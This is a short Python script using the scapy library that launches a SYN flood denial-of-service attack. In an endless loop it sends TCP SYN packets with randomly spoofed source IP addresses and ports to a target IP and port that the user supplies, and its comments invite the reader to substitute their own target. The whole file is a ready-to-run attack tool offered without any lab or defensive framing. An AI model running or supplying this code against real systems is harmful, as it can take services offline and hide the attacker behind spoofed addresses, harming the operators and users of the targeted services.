from scapy.all import *
import random
import time

target_ip = "192.168.1.100"   # Replace with your target IP
target_port = 80              # Target service port (e.g., HTTP)

def syn_flood():
    print(f"[+] Starting SYN flood on {target_ip}:{target_port}")
    while True:
        # Create a spoofed IP address
        src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
        # Random source port
        src_port = random.randint(1024, 65535)
        
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 9000))

        packet = ip / tcp
        send(packet, verbose=0)

try:
    syn_flood()
except KeyboardInterrupt:
    print("\n[!] Stopped SYN flood")
